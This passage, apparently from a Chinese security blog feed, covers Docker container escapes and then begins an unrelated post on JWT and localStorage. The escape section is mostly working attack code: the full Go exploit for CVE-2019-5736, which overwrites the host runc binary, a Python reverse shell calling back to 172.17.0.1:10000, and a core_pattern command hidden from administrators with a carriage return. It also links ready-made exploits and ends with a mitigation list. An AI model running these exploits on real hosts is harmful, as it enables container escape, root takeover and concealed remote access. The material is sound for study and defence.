或者其他基于 runc 的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改掉 runc 的二进制文件，从而获取到宿主机的 root 执行权限。</p>\n<ol>\n<li></li>\n</ol>\n<p>首先编译 go 脚本，生成攻击 payload<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZGcmljaGV0dGVuJTJGQ1ZFLTIwMTktNTczNi1Qb0M=\">https://github.com/Frichetten/CVE-2019-5736-PoC</span></p>\n<p>修改脚本中的反弹地址为自己 vps 地址。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Implementation of CVE-2019-5736</span></span><br><span class=\"line\"><span class=\"comment\">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class=\"line\"><span class=\"comment\">// This commit also helped a ton to understand the vuln</span></span><br><span class=\"line\"><span class=\"comment\">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;fmt&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;io/ioutil&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;os&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;strconv&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;strings&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;flag&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> shellCmd <span class=\"type\">string</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">init</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tflag.StringVar(&amp;shellCmd, <span class=\"string\">&quot;shell&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;Execute arbitrary commands&quot;</span>)</span><br><span class=\"line\">\tflag.Parse()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// This is the line of shell commands that will execute on the host</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> payload = <span class=\"string\">&quot;#!/bin/bash \\n&quot;</span> + shellCmd</span><br><span class=\"line\">\t<span class=\"comment\">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span></span><br><span class=\"line\">\tfd, err := os.Create(<span class=\"string\">&quot;/bin/sh&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfmt.Fprintln(fd, <span class=\"string\">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class=\"line\">\terr = fd.Close()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Loop through all processes to find one whose cmdline includes runcinit</span></span><br><span class=\"line\">\t<span class=\"comment\">// This will be the process created by runc</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> found <span class=\"type\">int</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> found == <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\tpids, err := ioutil.ReadDir(<span class=\"string\">&quot;/proc&quot;</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> _, f := <span class=\"keyword\">range</span> pids &#123;</span><br><span class=\"line\">\t\t\tfbytes, _ := ioutil.ReadFile(<span class=\"string\">&quot;/proc/&quot;</span> + f.Name() + <span class=\"string\">&quot;/cmdline&quot;</span>)</span><br><span class=\"line\">\t\t\tfstring := <span class=\"type\">string</span>(fbytes)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> strings.Contains(fstring, <span class=\"string\">&quot;runc&quot;</span>) &#123;</span><br><span class=\"line\">\t\t\t\tfmt.Println(<span class=\"string\">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class=\"line\">\t\t\t\tfound, err = strconv.Atoi(f.Name())</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> &#123;</span><br><span class=\"line\">\t\t\t\t\tfmt.Println(err)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// We will use the pid to get a file handle for runc on the host.</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> handleFd = <span class=\"number\">-1</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> handleFd == <span class=\"number\">-1</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class=\"line\">\t\thandle, _ := os.OpenFile(<span class=\"string\">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class=\"string\">&quot;/exe&quot;</span>, os.O_RDONLY, <span class=\"number\">0777</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"type\">int</span>(handle.Fd()) &gt; <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\thandleFd = <span class=\"type\">int</span>(handle.Fd())</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// Now that we have the file handle, lets write to the runc binary and overwrite it</span></span><br><span class=\"line\">\t<span class=\"comment\">// It will maintain it&#x27;s executable flag</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> &#123;</span><br><span class=\"line\">\t\twriteHandle, _ := os.OpenFile(<span class=\"string\">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class=\"number\">0700</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"type\">int</span>(writeHandle.Fd()) &gt; <span class=\"number\">0</span> &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(<span class=\"string\">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class=\"line\">\t\t\tfmt.Println(<span class=\"string\">&quot;[+] The command executed is&quot;</span> + payload)</span><br><span class=\"line\">\t\t\twriteHandle.Write([]<span class=\"type\">byte</span>(payload))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译生成 payload，需要在 linux 中需要安装 go 环境 <code>yum install go</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go bulid main.go</span><br></pre></td></tr></table></figure>\n<p>将编译生成文件复制到 docker 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker cp main 78e0d8daa906:/home</span><br><span class=\"line\">docker exec -it 78e0d8daa906 /bin/bash</span><br></pre></td></tr></table></figure>\n<p>运行 main 文件，使用 nc 监听反弹的端口，等待启动 docker</p>\n<blockquote>\n<p>There are <strong>2</strong> use cases for the exploit. The first (which is what this repo is), is essentially a trap. An attacker would need to get command execution inside a container and start a malicious binary which would listen. When someone (attacker or victim) uses  <code>docker exec</code>  to get into the container, this will trigger the exploit which will allow code execution as root.</p>\n</blockquote>\n<p>在另外一个页面，启动 docker，运行 main 的页面会得到返回</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221129110937154.png\" alt=\"image-20221129110937154\">`</p>\n<p>描述的有些奇怪，可以去上面的 payload 的链接看看，里面有 video</p>\n<p>由于容器服务缺陷导致的逃逸还包括 Docker cp CVE-2019-14271 和 Docker build code execution CVE-2019-13139，利用起来都具有一定的限制条件，具体原理和利用可参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnVuaXQ0Mi5wYWxvYWx0b25ldHdvcmtzLmNvbSUyRmRvY2tlci1wYXRjaGVkLXRoZS1tb3N0LXNldmVyZS1jb3B5LXZ1bG5lcmFiaWxpdHktdG8tZGF0ZS13aXRoLWN2ZS0yMDE5LTE0MjcxJTJG\">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRnN0YWFsZHJhYWQuZ2l0aHViLmlvJTJGcG9zdCUyRjIwMTktMDctMTYtY3ZlLTIwMTktMTMxMzktZG9ja2VyLWJ1aWxkJTJG\">https://staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/</span></p>\n<h3 id=\"8containerd逃逸-cve-2020-15257\"><a class=\"markdownIt-Anchor\" href=\"#8containerd逃逸-cve-2020-15257\">#</a> 8.containerd 逃逸 - CVE-2020-15257</h3>\n<p>containerd 是一个控制 runC 的守护进程，提供命令行客户端和 API。当在 docker 使用–net=host 参数启动且与宿主机共享 net namespace 时，docker 容器会暴露 containerd-shim 监听的 Unix 域套接字，攻击者可以绕过访问权限访问 containerd 的控制 API 直接操作 containerd-shim ，来控制容器，从而实现 Docker 容器逃逸。</p>\n<p>exp: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nkay10ZWFtL0NESy9yZWxlYXNlcw==\">https://github.com/cdk-team/CDK/releases</span></p>\n<h3 id=\"9挂载proc导致逃逸\"><a class=\"markdownIt-Anchor\" href=\"#9挂载proc导致逃逸\">#</a> 9. 挂载 /proc 导致逃逸</h3>\n<p>linux 中的 <code>/proc</code>  目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。<br>\n当 docker 启动时将 <code>/proc</code>  目录挂载到容器内部时可以实现逃逸。</p>\n<p>通过文档可知， <code>/proc/sys/kernel/core_pattern</code>  文件是负责进程奔溃时内存数据转储的，当第一个字符是 <code>|</code>  管道符时，后面的的部分会以命令行的方式进行解析并运行。<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuNS9jb3JlLjUuaHRtbA==\">https://man7.org/linux/man-pages/man5/core.5.html</span><br>\n 并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。</p>\n<p>由于管道符的原因，错误的数据可能会扰乱我们的命令，因此这里用 python 接受并且忽略错误数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python3</span><br><span class=\"line\">import  os</span><br><span class=\"line\">import pty</span><br><span class=\"line\">import socket</span><br><span class=\"line\">lhost = &quot;172.17.0.1&quot;</span><br><span class=\"line\">lport = 10000</span><br><span class=\"line\">def main():</span><br><span class=\"line\">   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">   s.connect((lhost, lport))</span><br><span class=\"line\">   os.dup2(s.fileno(), 0)</span><br><span class=\"line\">   os.dup2(s.fileno(), 1)</span><br><span class=\"line\">   os.dup2(s.fileno(), 2)</span><br><span class=\"line\">   os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class=\"line\">   pty.spawn(&quot;/bin/bash&quot;)</span><br><span class=\"line\">   # os.remove(&#x27;/tmp/.x.py&#x27;)</span><br><span class=\"line\">   s.close()</span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">   main()</span><br></pre></td></tr></table></figure>\n<p>并且创建一个会抛出段错误的程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">int main(void)  &#123;</span><br><span class=\"line\">   int *a  = NULL;</span><br><span class=\"line\">   *a = 1;</span><br><span class=\"line\">   return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后在 <code>core_pattern</code>  文件中写入运行反弹 shell 的命令（这里需要注意由于是以宿主机上的权限运行的，因此 python 的路径则也是 docker 目录的路径）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">host_path=`sed -n &#x27;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#x27; /etc/mtab`</span><br><span class=\"line\">echo -e &quot;|$host_path/tmp/.x.py \\rcore    &quot; &gt;  /host-proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>\n<p><code>\\r</code>  之后的内容主要是为了为了管理员通过 <code>cat</code>  命令查看内容时隐蔽我们写入恶意命令。<br>\n这样当我们运行 c 文件之后，就会抛出段错误，然后执行 <code>core_pattern</code>  中的命令（运行成功 <code>core_pattern</code>  时会有 <code>core dumped</code>  的输出）</p>\n<h3 id=\"10k8s中挂载varlog\"><a class=\"markdownIt-Anchor\" href=\"#10k8s中挂载varlog\">#</a> 10.k8s 中挂载 /var/log</h3>\n<p>这里用单纯的挂载 <code>/var/log</code>  来形容这个逃逸的触发条件其实不太严谨，需要满足如下条件。</p>\n<ul>\n<li>挂载了 <code>/var/log</code></li>\n<li>容器是在一个 k8s 的环境中</li>\n<li>当前 pod 的 serviceaccount 拥有 get|list|watch log 的权限</li>\n</ul>\n<p>类似于赋予了当前 pod 一个读取日志的能力。<br>\n当满足以上条件时，可以与 node 节点的 10250 端口进行通信，并通过软链接的方式读取 node 上的文件。</p>\n<p>exp:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbHNhZ2kva3ViZS1wb2QtZXNjYXBl\">https://github.com/danielsagi/kube-pod-escape</span></p>\n<h2 id=\"防御docker逃逸\"><a class=\"markdownIt-Anchor\" href=\"#防御docker逃逸\">#</a> 防御 docker 逃逸</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736</span><br><span class=\"line\">2、runc版本 &gt; 1.0-rc6</span><br><span class=\"line\">3、k8s 集群版本&gt;1.12</span><br><span class=\"line\">4、Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</span><br><span class=\"line\">5、Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险</span><br><span class=\"line\">6、不建议以root权限运行Docker服务</span><br><span class=\"line\">7、不建议以privileged（特权模式）启动Docker</span><br><span class=\"line\">8、不建议将宿主机目录挂载至容器目录</span><br><span class=\"line\">9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，存在容器逃逸风险</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96b25lLmh1b3hpYW4uY24vZC8xMDM0LWRvY2tlci8y\">Docker 实现原理 - 火线 Zone - 云安全社区 (huoxian.cn)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTg3NzI1\">浅析 docker 的多种逃逸方法 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2luZ2trLmNvbS8yMDIxLzAxLyVFOSU4NSU4RCVFNyVCRCVBRSVFNCVCOCU4RCVFNSVCRCU5MyVFNSVBRiVCQyVFOCU4NyVCNCVFNyU5QSU4NCVFNSVBRSVCOSVFNSU5OSVBOCVFOSU4MCU4MyVFOSU4MCVCOC8=\">配置不当导致的容器逃逸 - Kingkk’s Blog</span></p>\n<p><a href=\"https://m01ly.github.io/2022/01/04/pt-docker-escape/#3-2-%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E4%B8%8D%E5%BD%93\">(<em>´∇｀</em>)~ docker 逃逸常用方法 | Hexo (m01ly.github.io)</a></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvY29udGFpbmVyLzI0Mjc2My5odG1s\">初识 Docker 逃逸 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95eXo5LmNuLzIwMjIvMDMvMjIvZG9ja2VyJUU5JTgwJTgzJUU5JTgwJUI4JUU2JTgwJTlEJUU4JUI3JUFGJUU2JTgwJUJCJUU3JUJCJTkzLw==\">Docker 逃逸思路总结 &amp;&amp; 复现 – yyz の blog (yyz9.cn)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/",
            "url": "http://example.com/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/",
            "title": "JWT",
            "date_published": "2022-11-17T05:38:45.000Z",
            "content_html": "<h1 id=\"jwt-基础\"><a class=\"markdownIt-Anchor\" href=\"#jwt-基础\">#</a> JWT 基础</h1>\n<p>JWT （JSON Web Token） 是目前最流行的跨域认证解决方案，是一种基于 Token 的认证授权机制。 从 JWT 的全称可以看出，JWT 本身也是 Token，一种规范化之后的 JSON 结构的 Token。</p>\n<p>JWT 自身包含了身份验证所需要的所有信息，因此，我们的服务器不需要存储 Session 信息。这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。</p>\n<p>可以看出，<strong>JWT 更符合设计 RESTful API 时的「Stateless（无状态）」原则</strong> 。</p>\n<p>并且， 使用 JWT 认证可以有效避免 CSRF 攻击，因为 JWT 一般是存在在 localStorage 中，使用 JWT 进行身份验证的过程中是不会涉及到 Cookie 的。</p>\n<h2 id=\"localstorage与cookie\"><a class=\"markdownIt-Anchor\" href=\"#localstorage与cookie\">#</a> localstorage 与 cookie</h2>\n<p>localStorage 和 sessionStorage 属性允许在浏览器中存储 key/value 对的数据。</p>\n<p>localStorage 用于长久保存整个网站的数据，保存的数据没有过期时间，直到手动去删除。</p>\n<p>localStorage 属性是只读的。</p>\n<p><strong>提示:</strong> 如果你只想将数据保存在当前会话中，可以使用 sessionStorage 属性， 该数据对象临时保存同一窗口 (或标签页) 的数据，在关闭窗口或标签页之后将会删除这些数据。</p>\n<p><strong>localStorage 的优势</strong></p>\n<ul>\n<li>1、localStorage 拓展了 cookie 的 4K 限制。</li>\n<li>2、localStorage 会可以将第一次请求的数据直接存储到本地，这个相当于一个 5M 大小的针对于前端页面的数据库，相比于 cookie 可以节约带宽，但是这个却是只有在高版本的浏览器中才支持的。</li>\n</ul>\n<p><strong>localStorage 的局限</strong></p>\n<ul>\n<li>1、浏览器的大小不统一，并且在 IE8 以上的 IE 版本才支持 localStorage 这个属性。</li>\n<li>2、目前所有的浏览器中都会把 localStorage 的值类型限定为 string 类型，这个在对我们日常比较常见的 JSON 对象类型需要一些转换。</li>\n<li>3、localStorage 在浏览器的隐私模式下面是不可读取的。</li>\n<li>4、localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡。</li>\n<li>5、localStorage 不能被爬虫抓取到。</li>\n</ul>\n<p>localStorage 与 sessionStorage 的唯一一点区别就是 localStorage 属于永久性存储，而 sessionStorage 属于当会话结束的时候，sessionStorage 中的键值对会被清空。</p>\n<p>localStorage 的使用也是遵循同源策略的，所以不同的网站直接是不能共用相同的 localStorage。</p>\n<p><strong>localStorage 使用</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(！window.localStorage)&#123;</span><br><span class=\"line\">    alert(&quot;浏览器不支持localstorage&quot;);</span><br><span class=\"line\">    return false;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    var storage=window.localStorage;</span><br><span class=\"line\">    //写入a字段</span><br><span class=\"line\">    storage[&quot;a&quot;]=1;</span><br><span class=\"line\">    //写入b字段</span><br><span class=\"line\">    storage.b=1;</span><br><span class=\"line\">    //写入c字段</span><br><span class=\"line\">    storage.setItem(&quot;c&quot;,3);</span><br><span class=\"line\">    console.log(typeof storage[&quot;a&quot;]);</span><br><span class=\"line\">    console.log(typeof storage[&quot;b&quot;]);</span><br><span class=\"line\">    console.log(typeof storage[&quot;c&quot;]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>localStorage 的读取</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!window.localStorage)&#123;</span><br><span class=\"line\">    alert(&quot;浏览器不支持localstorage&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    var storage=window.localStorage;</span><br><span class=\"line\">    //写入a字段</span><br><span class=\"line\">    storage[&quot;a&quot;]=1;</span><br><span class=\"line\">    //写入b字段</span><br><span class=\"line\">    storage.b=1;</span><br><span class=\"line\">    //写入c字段</span><br><span class=\"line\">    storage.setItem(&quot;c&quot;,3);</span><br><span class=\"line\">    console.log(typeof storage[&quot;a&quot;]);</span><br><span class=\"line\">    console.log(typeof storage[&quot;b&quot;]);</span><br><span class=\"line\">    console.log(typeof storage[&quot;c&quot;]);</span><br><span class=\"line\">    //第一种方法读取</span><br><span class=\"line\">    var a=storage.a;</span><br><span class=\"line\">    console.log(a);</span><br><span class=\"line\">    //第二种方法读取</span><br><span class=\"line\">    var b=storage[&quot;b&quot;];</span><br><span class=\"line\">    console.log(b);</span><br><span class=\"line\">    //第三种方法读取</span><br><span class=\"line\">    var c=storage.getItem(&quot;c&quot;);</span><br><span class=\"line\">    console.log(c);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一般我们会将 JSON 存入 localStorage 中，但是在 localStorage 会自动将 localStorage 转换成为字符串形式。</p>\n<p>这个时候我们可以使用 JSON.stringify () 这个方法，来将 JSON 转换成为 JSON 字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var storage=window.localStorage;</span><br><span class=\"line\">var data=&#123;</span><br><span class=\"line\">    name:&#x27;xiecanyong&#x27;,</span><br><span class=\"line\">    sex:&#x27;man&#x27;,</span><br><span class=\"line\">    hobby:&#x27;program&#x27;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var d=JSON.stringify(data);</span><br><span class=\"line\">storage.setItem(&quot;data&quot;,d);</span><br><span class=\"line\">//将JSON字符串转换成为JSON对象输出</span><br><span class=\"line\">var json=storage.getItem(&quot;data&quot;);</span><br><span class=\"line\">var jsonObj=JSON.parse(json);</span><br><span class=\"line\">console.log(typeof jsonObj);</span><br></pre></td></tr></table></figure>\n<p>打印出来是 Object 对象。</p>\n<p>另外还有一点要注意的是，其他类型读取出来也要进行转换。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206150034668.png\" alt=\"image-20221206150034668\"></p>\n<h2 id=\"jwt组成\"><a class=\"markdownIt-Anchor\" href=\"#jwt组成\">#</a> JWT 组成</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt-composition.png\" 